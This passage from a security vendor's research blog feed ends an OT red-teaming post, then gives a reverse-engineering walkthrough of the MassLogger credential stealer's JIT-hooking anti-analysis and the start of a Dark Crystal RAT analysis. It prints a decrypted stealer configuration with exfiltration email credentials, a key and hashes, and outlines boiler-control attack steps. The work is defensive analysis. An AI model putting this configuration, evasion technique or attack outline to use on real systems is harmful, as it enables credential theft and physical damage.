  attacker could perform to access devices governing the boiler drum and
  modify the water level while remaining undetected. With the level of
  access obtained from phase 1, the attacker would likely be able to
  compromise engineering workstations (EWS) for the boiler drum's
  controller using similar tools. This would likely enable the actor to
  perform actions such as changing the drum level setpoints, modifying
  the flow of steam scaling, or modifying water flow scaling. While the
  model does not reflect all additional safety and security measures
  that may be present deeper in the process, it does account for the
  attacker's need to modify alarms and control sensor outputs to remain undetected.</p>
 <p>By connecting the outcomes produced in the test to the potential
  physical impacts and motivations involved in a real attack, this model
  provided Big Steam Works with a realistic overview of cyber security
  threats to a specific physical process. Further collaboration with the
  customer enabled us to validate the findings and support the
  organization to mitigate the risks reflected in the model.</p>
 <h4>Outlook</h4>
 <p>Mandiant's OT red teaming supports organizations by combining both
  the hands-on analysis of vulnerabilities and weaknesses in IT and OT
  networks with the conceptual modeling of attacker goals and possible
  avenues to reach specific outcomes. It also enables security
  practitioners to adopt the attacker's perspective and explore attack
  vectors that may otherwise have not been conceived regardless of their
  value as low-hanging fruit for OT intrusions.</p>
 <p>Our approach presents realistic scenarios based upon technical
  evidence of intrusion activity upon OT intermediary systems in the
  tested network. In this way, it is tailored to support
  consequence-driven analysis of threats to specific critical systems
  and processes. This enables organizations to identify attack scenarios
  involving digital assets and determine safeguards that can best help
  to protect the process and ensure the safety of their facilities.</p>
 <p>Head over to our website for <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">more
  information</a> or to request <a
    href="/content/fireeye-www/en_US/mandiant.html">Mandiant
  services</a> or <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">threat intelligence</a>.</p>
http://www.fireeye.com/blog/threat-research/2020/08/hands-on-introduction-to-mandiant-approach-to-ot-red-teaming.html2020-08-25T09:00:00.000Z2020-08-25T08:35:17.672ZBypassing MassLogger Anti-Analysis — a Man-in-the-Middle Approachnoemail@noemail.orgNhan Huynh<p>The FireEye Front Line Applied Research &amp; Expertise (FLARE) Team
  attempts to always stay on top of the most current and emerging
  threats. As a member of the FLARE Reverse Engineer team, I recently
  received a request to analyze a fairly new credential stealer
  identified as MassLogger. Despite the lack of novel functionalities
  and features, this sample employs a sophisticated technique that
  replaces the Microsoft Intermediate Language (MSIL) at run time to
  hinder static analysis. At the time of this writing, there is only <a
    href="https://cert-agid.gov.it/wp-content/uploads/2020/06/CERT-AGID_MassLogger-20200609.pdf">one
  publication</a> discussing the MassLogger obfuscation technique in
  some detail. Therefore, I decided to share my research and <a
    href="https://github.com/fireeye/jitm">tools to help analyze
    MassLogger and other malware using a similar technique</a>. Let us
  take a deep technical dive into the MassLogger credential stealer and
  the .NET runtime.</p>
 <h4>Triage</h4>
 <p>MassLogger is a .NET credential stealer. It starts with a launcher
    (<span
  class="code">6b975fd7e3eb0d30b6dbe71b8004b06de6bba4d0870e165de4bde7ab82154871</span>)
  that uses simple anti-debugging techniques which can be easily
  bypassed when identified. This first stage loader eventually
  XOR-decrypts the second stage assembly which then decrypts, loads and
  executes the final MassLogger payload (<span
  class="code">bc07c3090befb5e94624ca4a49ee88b3265a3d1d288f79588be7bb356a0f9fae</span>)
  named <span class="code">Bin-123.exe</span>. The final payload can be
  easily extracted and executed independently. Therefore, we will focus
  exclusively on this final payload where the main anti analysis
  technique is used.</p>
 <p>Basic static analysis doesn’t reveal anything too exciting. We
  notice some interesting strings, but they are not enough to give us
  any hints about the malware’s capabilities. Executing the payload in a
  controlled environment shows that the sample drops a log file that
  identifies the malware family, its version, and most importantly some
  configuration options. A sample log file is described in Figure 1. We
  can also extract some interesting strings from memory as the sample
  runs. However, basic dynamic analysis is not sufficient to extract all
  host-based indicators (HBIs), network-based indicators (NBIs) and
  complete malware functionality. We must perform a deeper analysis to
  better understand the sample and its capabilities.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">User Name: user<br />  IP: 127.0.0.1<br />
            Location: United States<br />  OS: Microsoft Windows 7
            Ultimate 32bit<br />  CPU: Intel(R) Core(TM) i7-6820HQ CPU @
            2.70GHz<br />  GPU: VMware SVGA 3D<br />  AV: NA<br />
            Screen Resolution: 1438x2460<br />  Current Time: 6/17/2020
            1:23:30 PM<br />  MassLogger Started: 6/17/2020 1:23:21
            PM<br />  Interval: 2 hour<br />  MassLogger Process:
            C:\Users\user\Desktop\Bin-123.exe<br />  MassLogger Melt:
            false<br />  MassLogger Exit after delivery: false<br />  As
            Administrator: False<br />  Processes:<br />  Name:cmd,
            Title:Administrator: FakeNet-NG - fakenet<br />
            Name:iexplore, Title:FakeNet-NG - Internet Explorer<br />
            Name:dnSpy-x86, Title:dnSpy v6.0.5 (32-bit)<br />  Name:cmd,
            Title:Administrator: C:\Windows\System32\cmd.exe<br />
            Name:ProcessHacker, Title:Process Hacker
            [WIN-R23GG4KO4SD\user]+ (Administrator)</span></p> <p>
          <span class="code">### WD Exclusion ###<br />
        Disabled</span></p> <p>
          <span class="code">### USB Spread ###<br />
        Disabled</span></p> <p>
          <span class="code">### Binder ###<br />  Disabled</span></p> <p>
          <span class="code">### Window Searcher ###<br />
        Disabled</span></p> <p>
          <span class="code">### Downloader ###<br />
        Disabled</span></p> <p>
          <span class="code">### Bot Killer ###<br />
        Disabled</span></p> <p>
          <span class="code">### Search And Upload ###<br />
        Disabled</span></p> <p>
          <span class="code">### Telegram Desktop ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### Pidgin ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### FileZilla ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### Discord Tokken ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### NordVPN ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### Outlook ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### FoxMail ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### Thunderbird ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### QQ Browser ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### FireFox ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### Chromium Recovery ###<br />  Not
        Installed</span></p> <p>
          <span class="code">### Keylogger And Clipboard ###</span></p> <p>
          <span class="code"> </span></p> <p>
          <span class="code">[20/06/17]  [Welcome to Chrome - Google
            Chrome]<br />  [ESC]</span></p> <p>
          <span class="code">[20/06/17]  [Clipboard]<br />
        Vewgbprxvhvjktmyxofjvpzgazqszaoo</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: Sample MassLogger log</span></p>
 <h4>Just Decompile It</h4>
 <p>Like many other .NET malwares, MassLogger obfuscates all of its
  methods names and even the method control flow. We can use <span
  class="code">de4dot</span> to automatically deobfuscate the MassLogger
  payload. However, looking at the deobfuscated payload, we quickly
  identify a major issue: Most of the methods contain almost no logic as
  shown in Figure 2.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: dnSpy showing empty methods</span></p>
 <p>Looking at the original MassLogger payload in <span
  class="code">dnSpy</span>’s Intermediate Language (IL) view confirms
  that most methods do not contain any logic and simply return nothing.
  This is obviously not the real malware since we already observed with
  dynamic analysis that the sample indeed performs malicious activities
  and logging to a log file. We are left with a few methods, most
  notably the method with the token <span class="code">0x0600049D</span>
  called first thing in the main module constructor.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: dnSpy IL view showing the
    method's details</span></p>
 <p>Method <span class="code">0x0600049D</span> control flow has been
  obfuscated into a series of switch statements. We can still somewhat
  follow the method’s high-level logic with the help of <span
  class="code">dnSpy</span> as a debugger. However, fully analyzing the
  method would be very time consuming. Instead, when first analyzing
  this payload, I chose to quickly scan over the entire module to look
  for hints. Luckily, I spot a few interesting strings I missed during
  basic static analysis: <span class="code">clrjit.dll</span>, <span
  class="code">VirtualAlloc</span>, <span
  class="code">VirtualProtect</span> and <span
  class="code">WriteProcessMemory</span> as seen in Figure 4.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Interesting strings scattered
    throughout the module</span></p>
 <p>A quick internet search for “<span class="code">clrjit.dll</span>”
  and “<span class="code">VirtualProtect</span>” quickly takes us to <a
  href="https://xoofx.com/blog/2018/04/12/writing-managed-jit-in-csharp-with-coreclr/">a</a>
    <a
  href="https://georgeplotnikov.github.io/articles/just-in-time-hooking.html">few</a>
    <a
  href="http://antonioparata.blogspot.com/2018/02/analyzing-nasty-net-protection-of.html">publications</a>
  describing a technique commonly referred to as Just-In-Time Hooking.
  In essence, JIT Hooking involves installing a hook at the <span
  class="code">compileMethod()</span> function where the JIT compiler is
  about to compile the MSIL into assembly (x86, x64, etc). With the hook
  in place, the malware can easily replace each method body with the
  real MSIL that contains the original malware logic. To fully
  understand this process, let’s explore the .NET executable, the .NET
  methods, and how MSIL turns into x86 or x64 assembly.</p>
 <h4>.NET Executable Methods</h4>
 <p>A .NET executable is just another binary following the Portable
  Executable (PE) format. There are plenty of resources describing the
    <a
  href="https://bytepointer.com/resources/pietrek_peering_inside_pe.htm">PE</a>
    <a
  href="https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail">file</a>
    <a
  href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN">format</a>,
  the <a href="https://www.ntcore.com/files/dotnetformat.htm">.NET
  metadata</a> and the .NET token tables in detail. I recommend our
  readers to take a quick detour and refresh their memory on those
  topics before continuing. This post won’t go into further details but
  will focus on the .NET methods instead.</p>
 <p>Each .NET method in a .NET assembly is identified by a token. In
  fact, everything in a .NET assembly, whether it’s a module, a class, a
  method prototype, or a string, is identified by a token. Let’s look at
  method identified by the token <span class="code">0x0600049D</span>,
  as shown in Figure 5. The most-significant byte (<span
  class="code">0x06</span>) tells us that this token is a method token
  (type <span class="code">0x06</span>) instead of a module token (type
    <span class="code">0x00</span>), a TypeDef token (type <span
  class="code">0x02</span>), or a LocalVarSig token (type <span
  class="code">0x11</span>), for example. The three least significant
  bytes tell us the ID of the method, in this case it’s <span
  class="code">0x49D</span> (<span class="code">1181</span> in decimal).
  This ID is also referred to as the Method ID (MID) or the Row ID of
  the method.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Method details for method 0x0600049D</span></p>
 <p>To find out more information about this method, we look within the
  tables of the “<span class="code">#~</span>” stream of the .NET
  metadata streams in the .NET metadata directory as show in Figure 6.
  We traverse to the entry number <span class="code">1181</span> or
    <span class="code">0x49D</span> of the Method table to find the
  method metadata which includes the Relative Virtual Address (RVA) of
  the method body, various flags, a pointer to the name of the method, a
  pointer to the method signature, and finally, an pointer to the
  parameters specification for this method. <b>Please note that the MID
    starts at 1 instead of 0</b>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Method details from the PE file header</span></p>
 <p>For method <span class="code">0x0600049D</span>, the RVA of the
  method body is <span class="code">0xB690</span>. This RVA belongs to
  the <span class="code">.text</span> section whose RVA is <span
  class="code">0x2000</span>. Therefore, this method body begins at
    <span class="code">0x9690</span> (<span class="code">0xB690</span> –
    <span class="code">0x2000</span>) bytes into the <span
  class="code">.text</span> section. The <span class="code">.text</span>
  section starts at <span class="code">0x200</span> bytes into the file
  according to the section header. As a result, we can find the method
  body at <span class="code">0x9890</span> (<span
  class="code">0x9690</span> + <span class="code">0x200</span>) bytes
  offset into the file. We can see the method body in Figure 7.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Method 0x0600049D body in a hex editor</span></p>
 <h4>.NET Method Body</h4>
 <p>The .NET method body starts with a method body header, followed by
  the MSIL bytes. There are two types of .NET methods: a tiny method and
  a fat method. Looking at the first byte of the method body header, the
  two least-significant bits tell us if the method is tiny (where the
  last two bits are <span class="code">10</span>) or fat (where the last
  two bits are <span class="code">11</span>).</p>
 <p>
  <i>.NET Tiny Method</i></p>
 <p>Let’s look at method <span class="code">0x06000495</span>. Following
  the same steps described earlier, we check the row number <span
  class="code">0x495</span> (<span class="code">1173</span> in decimal)
  of the Method table to find the method body RVA is <span
  class="code">0x7A7C</span> which translates to <span
  class="code">0x5C7C</span> as the offset into the file. At this
  offset, the first byte of the method body is <span
  class="code">0x0A</span> (<span class="code">0000</span> <span
  class="code">1010</span> in binary).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Method 0x06000495 metadata and body</span></p>
 <p>Since the two least-significant bits are <span
  class="code">10</span>, we know that <span
  class="code">0x06000495</span> is a tiny method. For a tiny method,
  the method body header is <b>one byte long</b>. The <b>two
    least-significant bits</b> are <span class="code">10</span> to
  indicate that this is the tiny method, and the <b>six most-significant
  bits</b> tell us the size of the MSIL to follow (i.e. how long the
  MSIL is). In this case, the six most-significant bits are <span
  class="code">000010</span>, which tells us the method body is two
  bytes long. The entire method body for <span
  class="code">0x06000495</span> is <span class="code">0A</span> <span
  class="code">16</span> <span class="code">2A</span>, followed by a
  NULL byte, which has been disassembled by <span
  class="code">dnSpy</span> as shown in Figure 9.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Method 0x06000495 in dnSpy IL view</span></p>
 <p>
  <i>.NET Fat Method</i></p>
 <p>Coming back to method <span class="code">0x0600049D</span> (entry
  number <span class="code">1181</span>) at offset <span
  class="code">0x9890</span> into the file (RVA <span
  class="code">0xB690</span>), the first byte of the method body is
    <span class="code">0x1B</span> (or <span class="code">0001</span>
    <span class="code">1011</span> in binary). The two least-significant
  bits are <span class="code">11</span>, indicating that <span
  class="code">0x0600049D</span> is a fat method. The fat method body
  header is <b>12-byte long</b> whose structure is beyond the scope of
  this blog post. The field we really care about is a <b>four-byte
  field</b> at <b>offset <span class="code">0x04</span> byte</b> into
  this fat header. This field specifies the length of the MSIL that
  follows this method body header. For method <span
  class="code">0x0600049D</span>, the entire method body header is
    “<span class="code">1B 30 08 00 <b>A8 61 00 00</b> 75 00 00
  11</span>” and the length of the MSIL to follow is “<span
    class="code">A8 61 00 00</span>” or <span class="code">0x61A8</span>
    (<span class="code">25000</span> in decimal) bytes.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Method 0x0600049D body in a
    hex editor</span></p>
 <h4>JIT Compilation</h4>
 <p>Whether a method is tiny or fat, it does not execute as is. When the
  .NET runtime needs to execute a method, it follows exactly the process
  described earlier to find the method body which includes the method
  body header and the MSIL bytes. If this is the first time the method
  needs to run, the .NET runtime invokes the Just-In-Time compiler which
  takes the MSIL bytes and compiles them into x86 or x64 assembly
  depending on whether the current process is 32- or 64-bit. After some
  preparation, the JIT compiler eventually calls the <span
  class="code">compileMethod()</span> function. The entire .NET runtime
  project is open-sourced and <a
    href="https://github.com/dotnet/runtime">available on GitHub</a>. We
  can easily find out that the <span class="code">compileMethod()</span>
  function has the following prototype (Figure 11):</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">CorJitResult __stdcall compileMethod
          (<br />      ICorJitInfo                      
          *comp,               /* IN */<br />     
          CORINFO_METHOD_INFO               *<b>info</b>,              
          /* IN */<br />      unsigned /* code:CorJitFlag */   
          flags,               /* IN */<br />     
          BYTE                              **nativeEntry,       /* OUT
          */<br />      ULONG                            
          *nativeSizeOfCode    /* OUT */<br />  );</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: compileMethod() function protype</span></p>
 <p>Figure 12 shows the <span class="code">CORINFO_METHOD_INFO</span> structure.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">struct CORINFO_METHOD_INFO<br />  {<br />
                CORINFO_METHOD_HANDLE       ftn;<br />       
          CORINFO_MODULE_HANDLE       scope;<br />        BYTE
          *                      <b>ILCode</b>;<br />       
          unsigned                    <b>ILCodeSize</b>;<br />       
          unsigned                    maxStack;<br />       
          unsigned                    EHcount;<br />       
          CorInfoOptions              options;<br />       
          CorInfoRegionKind           regionKind;<br />       
          CORINFO_SIG_INFO            args;<br />       
          CORINFO_SIG_INFO            locals;<br />  };</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 12: CORINFO_METHOD_INFO structure</span></p>
 <p>The <span class="code">ILCode</span> is a pointer to the MSIL of the
  method to compile, and the <span class="code">ILCodeSize</span> tells
  us how long the MSIL is. The return value of <span
  class="code">compileMethod()</span> is an error code indicating
  success or failure. In case of success, the <span
  class="code">nativeEntry</span> pointer is populated with the address
  of the executable memory region containing the x86 or the x64
  instruction that is compiled from the MSIL.</p>
 <h4>MassLogger JIT Hooking</h4>
 <p>Let’s come back to MassLogger. As soon as the main module
  initialization runs, it first decrypts MSIL of the other methods. It
  then installs a hook to execute its own version of <span
  class="code">compileMethod()</span> (method <span
  class="code">0x06000499</span>). This method replaces the <span
  class="code">ILCode</span> and <span class="code">ILCodeSize</span>
  fields of the info argument to the original <span
  class="code">compileMethod()</span> with the real malware’s MSIL bytes.</p>
 <p>In addition to replacing the MSIL bytes, MassLogger also patches the
  method body header at module initialization time. As seen from Figure
  13, the method body header of method <span
  class="code">0x060003DD</span> on disk (at file offset 0x3CE0) is
  different from the header in memory (at RVA <span
  class="code">0x5AE0</span>). The only two things remaining quite
  consistent are the least significant two bits indicating whether the
  method is tiny or fat. To successfully defeat this anti-analysis
  technique, we must recover the real MSIL bytes as well as the correct
  method body headers.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Same method body with
    different headers when resting on disk vs. loaded in memory</span></p>
 <h4>Defeating JIT Method Body Replacement With JITM</h4>
 <p>To automatically recover the MSIL and the method body header, one
  possible approach suggested by another FLARE team member is to install
  our own hook at <span class="code">compileMethod()</span> function
  before loading and allowing the MassLogger module constructor to run. 
  There are <a
  href="https://georgeplotnikov.github.io/articles/just-in-time-hooking.html">multiple</a>
    <a
  href="https://ntcore.com/files/netint_injection.htm">tutorials</a> and
    <a
  href="https://xoofx.com/blog/2018/04/12/writing-managed-jit-in-csharp-with-coreclr/">open-sourced</a>
    <a href="https://github.com/maddnias/SJITHook">projects</a> on
  hooking <span class="code">compileMethod()</span> using both managed
  hooks (the new <span class="code">compileMethod()</span> is a managed
  method written in C#) and native hooks (the new <span
  class="code">compileMethod()</span> is native and written in C or
  C++). However, due to the unique way MassLogger hooks <span
  class="code">compileMethod()</span>, we cannot use the vtable hooking
  technique implemented by many of the aforementioned projects.
  Therefore, I’d like to share the following project: <a
  href="https://github.com/fireeye/jitm">JITM</a>, which is designed use
  inline hooking implemented by <a
  href="https://github.com/stevemk14ebr/PolyHook_2_0">PolyHook</a>
  library. JITM comes with a wrapper for <span
  class="code">compileMethod()</span> which logs all the method body
  headers and MSIL bytes to a JSON file before calling the original
    <span class="code">compileMethod()</span>.</p>
 <p>In addition to the hook, <span class="code">JITM</span> also
  includes a .NET loader. This loader first loads the native hook DLL
    (<span class="code">jitmhook.dll</span>) and installs the hook. The
  loader then loads the MassLogger payload and executes its entry point.
  This causes MassLogger’s module initialization code to execute and
  install its own hook, but hooking <span
  class="code">jitmhook.dll</span> code instead of the original <span
  class="code">compileMethod()</span>. An alternative approach to
  executing MassLogger’s entry point is to call the <span
  class="code">RuntimeHelpers.PrepareMethod()</span> API to force the
  JIT compiler to run on all methods. This approach is better because it
  avoids running the malware, and it potentially can recover methods not
  called in the sample’s natural code path. However, additional work is
  required to force all methods to be compiled properly.</p>
 <p>To load and recover MassLogger methods, first run the following
  command (Figure 14):</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">jitm.exe <b>Bin-123.exe</b>
      [optional_timeout]</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 14: Command to run jitm</span></p>
 <p>Once the timeout expires, you should see the files <span
  class="code">jitm.log</span> and <span class="code">jitm.json</span>
  created in the current directory. <span class="code">jitm.json</span>
  contains the method tokens, method body headers and MSIL bytes of all
  methods recovered from <span class="code">Bin-123.exe</span>. The only
  thing left to do is to rebuild the .NET metadata so we can perform
  static analysis.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure15.png" alt="" />
  <br /> <span class="type-XS">Figure 15: Sample jitm.json</span></p>
 <h4>Rebuilding the Assembly</h4>
 <p>Since the decrypted method body headers and MSIL bytes may not fit
  in the original .NET assembly properly, the easiest thing to do is to
  add a new section and a section header to MassLogger. There are <a
  href="https://reverseengineering.stackexchange.com/questions/15045/adding-a-new-pe-section-for-a-code-cave">plenty</a>
  of <a
  href="https://reverseengineering.stackexchange.com/questions/8390/python-adding-a-asection-to-a-pe-file">resources</a>
  on <a
    href="https://reverseengineering.stackexchange.com/questions/13995/adding-section-to-pe-binary-using-stud-pe">how
  to</a> <a
    href="http://www.rohitab.com/discuss/topic/41466-add-a-new-pe-section-code-inside-of-it/">add
    a PE section header and data</a>, none of which is trivial or easy
  to automate. Therefore, <span class="code">JITM</span> also include
  the following Python 2.7 helper script to automate this process: <span class="code">Scripts\addsection.py</span>.</p>
 <p>With the method body header and MSIL of each method added to a new
  PE section as shown in Figure 16, we can easily parse the .NET
  metadata and fix each method’s RVA to point to the correct method body
  within the new section. Unfortunately, I did not find any Python
  library to easily parse the .NET metadata and the MethodDef table.
  Therefore, <span class="code">JITM</span> also includes a partially
  implemented .NET metadata parser: <span
  class="code">Script\pydnet.py</span>. This script uses <span
  class="code">pefile</span> and <span class="code">vivisect</span>
  modules and parses the PE file up to the <span
  class="code">Method</span> table to extract all methods and their
  associated RVAs.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure16.png" alt="" />
  <br /> <span class="type-XS">Figure 16: Bin-123.exe before and after
    adding an additional section named FLARE</span></p>
 <p>Finally, to tie everything together, <span class="code">JITM</span>
  provides <span class="code">Script\fix_assembly.py</span> to perform
  the following tasks:</p>
 <ol> <li>Write the method body header and MSIL of each method recovered
    in <span class="code">jitm.json</span> into a temporary binary file
    named “<span class="code">section.bin</span>” while at the same time
    remember the associated method token and the offset into <span
  class="code">section.bin</span>.</li> <li>Use <span
    class="code">addsection.py</span> to add <span
    class="code">section.bin</span> into <span
    class="code">Bin-123.exe</span> and save the data into a new file,
    e.g. <span class="code">Bin-123.fixed.exe</span>.</li> <li>Use <span
    class="code">pydnet.py</span> to parse <span
    class="code">Bin-123.fixed.exe</span> and update the RVA field of
    each method entry in the MethodDef table to point to the correct RVA
    into the new section.</li> </ol>
 <p>The final result is a partially reconstructed .NET assembly.
  Although additional work is necessary to get this assembly to run
  correctly, it is good enough to perform static analysis to understand
  the malware’s high-level functionalities.</p>
 <p>Let’s look at the reconstructed method <span
  class="code">0x0600043E</span> that implements the decryption logic
  for the malware configuration. Compared to the original MSIL, the
  reconstructed MSIL now shows that the malware uses <span
  class="code">AES-256</span> in <span class="code">CBC</span> mode with
    <span class="code">PKCS7</span> padding. With a combination of
  dynamic analysis and static analysis, we can also easily identify the
  key to be “<span class="code">Vewgbprxvhvjktmyxofjvpzgazqszaoo</span>”
  and the IV to be part of the <span class="code">Base64</span>-encoded
  buffer passed in as its argument.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure17.png" alt="" />
  <br /> <span class="type-XS">Figure 17: Method 0x0600043 before and
    after fixing the assembly</span></p>
 <p>Armed with that knowledge, we can write a simple tool to decrypt the
  malware configuration and recover all HBIs and NBIs (Figure 18).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td>                            <span class="code">  BinderBytes:
          AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br />               
            BinderName: Mzvmy_Nyrrd<br />                  BinderOnce:
          false<br />          DownloaderFilename: Hrebxs<br />         
              DownloaderOnce: false<br />               DownloaderUrl:
          Vrwus<br />                EmailAddress:
          appfoil@outlook.com<br />                 EmailClient:
          smtp.outlook.com<br />                 EmailEnable: true<br />
                           EmailPass: services000<br />                 
           EmailPort: 587<br />                 EmailSendTo:
          appfoil@outlook.com<br />                    EmailSsl:
          True<br />          EnableAntiDebugger: false<br />         
          EnableAntiHoneypot: false<br />         EnableAntiSandboxie:
          false<br />            EnableAntiVMware: false<br />         
                EnableBinder: false<br />             EnableBotKiller:
          false                               <br />     
           EnableBrowserRecovery: true<br />
          EnableDeleteZoneIdentifier: false<br />           
          EnableDownloader: false<br />              EnableForceUac:
          false<br />               EnableInstall: false<br />         
             EnableKeylogger: true<br />            EnableMemoryScan:
          false<br />                 EnableMutex: false<br />         
            EnableScreenshot: false<br />       EnableSearchAndUpload:
          false<br />             EnableSpreadUsb: false<br />         
           EnableWDExclusion: false<br />        EnableWindowSearcher:
          false<br />               ExectionDelay: 6<br />         
           ExitAfterDelivery: false<br />                   FtpEnable:
          false<br />                     FtpHost: ftp://127.0.0.1<br />
                             FtpPass:<br />                     FtpPort:
          21<br />                     FtpUser: Foo<br />               
           InstallFile: Pkkbdphw<br />               InstallFolder:
          %AppData%<br />         InstallSecondFolder: Eqrzwmf<br />   
                               Key:<br />                       Mutex:
          Ysjqh<br />                 PanelEnable: false<br />         
                   PanelHost: http://example.com/panel/upload.php<br />
           SearchAndUploadExtensions: .jpeg, .txt, .docx, .doc,<br />   
          SearchAndUploadSizeLimit: 500000<br />     
          SearchAndUploadZipSize: 5000000<br />               
          SelfDestruct: false<br />             SendingInterval: 2<br />
                             Version: MassLogger v1.3.4.0<br />     
          WindowSearcherKeywords: youtube, facebook, amazon,</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 18: Decrypted configuration</span></p>
 <h4>Conclusion</h4>
 <p>Using a JIT compiler hook to replace the MSIL is a powerful
  technique that makes static analysis almost impossible. Although this
  technique is not new, I haven’t seen many .NET malwares making use of
  it, let alone trying to implement their own adaptation instead of
  using widely available protectors like ConfuserEx. Hopefully, with
  this blog post and <span class="code">
    <a href="https://github.com/fireeye/jitm">JITM</a></span>, analysts
  will now have the tools and knowledge to defeat MassLogger or any
  future variants that use a similar technique.</p>
 <p>If this is the type of work that excites you; and, if you thrive to
  push the state of the art when it comes to malware analysis and
  reverse engineering, the Front Line Applied Research and Expertise
  (FLARE) team may be a good place for you. The FLARE team faces fun and
  exciting challenges on a daily basis; and we are constantly looking
  for more team members to tackle these challenges head on. Check out <a
    href="https://www.fireeye.com/company/jobs.html">FireEye’s career
  page</a> to see if any of our opportunities would be a good fit for you.</p>
 <h4>Contributors (Listed Alphabetically)</h4>
 <ul> <li>Tyler Dean (<a
    href="https://twitter.com/spresec">@spresec</a>): Technical review
    of the post</li> <li>Michael Durakovich: Technical review of the
  post</li> <li>Stephen Eckels (<a
    href="https://github.com/stevemk14ebr/">@stevemk14ebr</a>): Help
    with porting JITM to use PolyHook</li> <li>Jon Erickson (<a
    href="https://github.com/evil-e">@evil-e</a>): Technical review of
    the post</li> <li>Moritz Raabe (<a
    href="https://twitter.com/m_r_tz?lang=en">@m_r_tz</a>): Technical
    review of the post</li> </ul>
http://www.fireeye.com/blog/threat-research/2020/08/bypassing-masslogger-anti-analysis-man-in-the-middle-approach.html2020-08-06T19:15:00.000Z2020-08-22T20:38:17.934ZAnalyzing Dark Crystal RAT, a C# Backdoornoemail@noemail.orgJacob Thompson<p>The <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">FireEye
    Mandiant Threat Intelligence Team</a> helps protect our customers by
  tracking cyber attackers and the malware they use. The FLARE Team
  helps augment our threat intelligence by reverse engineering malware
  samples. Recently, FLARE worked on a new C# variant of Dark Crystal
  RAT (DCRat) that the threat intel team passed to us. We reviewed open
  source intelligence and prior work, performed sandbox testing, and
  reverse engineered the Dark Crystal RAT to review its capabilities and
  communication protocol. Through publishing this blog post we aim to
  help defenders look for indicators of compromise and other telltale
  signs of Dark Crystal RAT, and to assist fellow malware researchers
  new to .NET malware, or who encounter future variants of this sample.</p>
 <h4>Discovering Dark Crystal RAT</h4>
 <p>The threat intel team provided FLARE with an EXE sample, believed to
  contain Dark Crystal RAT, and having the MD5 hash
  b478d340a787b85e086cc951d0696cb1. Using sandbox testing, we found that
  this sample produced two executables, and in turn, one of those two
  executables produced three more. Figure 1 shows the relationships
  between the malicious executables discovered via sandbox testing.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure1.png" alt="" />
  <span class="type-XS">
    <br /> Figure 1: The first sample we began analyzing ultimately
    produced five executables.</span></p>
 <p>Armed with the sandbox results, our next step was to perform a
  triage analysis on each executable. We found that the original sample
  and mnb.exe were droppers, that dal.exe was a clean-up utility to
  delete the dropped files, and that daaca.exe and fsdffc.exe were
  variants of Plurox, a family with existing reporting. Then we moved to
  analyzing the final dropped sample, which was dfsds.exe. We found
  brief public reporting by @<i>James_inthe_box </i>on the same sample,
    <a
    href="https://twitter.com/James_inthe_box/status/1178275531692756992?s=20">identifying
    it as DCRat and as a RAT and credential stealer</a>. We also found a
    <a
